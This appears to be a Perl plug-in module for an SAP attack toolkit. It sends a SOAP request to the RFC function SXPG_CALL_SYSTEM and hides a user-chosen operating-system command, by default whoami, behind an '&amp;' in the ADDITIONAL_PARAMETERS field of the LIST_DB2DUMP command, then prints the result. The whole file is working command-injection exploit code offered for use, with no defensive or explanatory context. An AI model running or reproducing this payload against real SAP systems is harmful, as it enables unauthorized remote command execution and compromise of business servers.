#!/usr/bin/perl
# Module Command execution (SXPG_COMMAND_EXECUTE)

# CONFIG
######################
my $desc ="Command execution (SXPG_COMMAND_SYSTEM) \n\t Usage: black.pl .. .. $argv[5] <command>\n\t <command> - command to execute, default is WHOAMI\n"; 
our $funcName="sxpg_command_system_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub sxpg_command_system_Func()
{

	my $XML='<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
	<SOAP-ENV:Body>
		<m:SXPG_CALL_SYSTEM xmlns:m="urn:sap-com:document:sap:rfc:functions">
			<ADDITIONAL_PARAMETERS> not_exist &amp; %COMMAND_NAME%</ADDITIONAL_PARAMETERS>
			<COMMANDNAME>LIST_DB2DUMP</COMMANDNAME>
			<EXEC_PROTOCOL>
				<item>
					<STDOUT>X</STDOUT>
				</item>
			</EXEC_PROTOCOL>
			</m:SXPG_CALL_SYSTEM>
	</SOAP-ENV:Body>
</SOAP-ENV:Envelope>';
	

	if ($ARGV[$m_arg_i+1]){
		$cmd=$ARGV[$m_arg_i+1];
		print $cmd." - cmd \n\n";
	} else {
		$cmd='whoami';
	}
	
	$XML=~s/%COMMAND_NAME%/$cmd/s;
	
	my @answers=send_soap($XML,1);

	my $answer=join('', @answers);

	print "$answer\r\n";

	print "\n\n";

}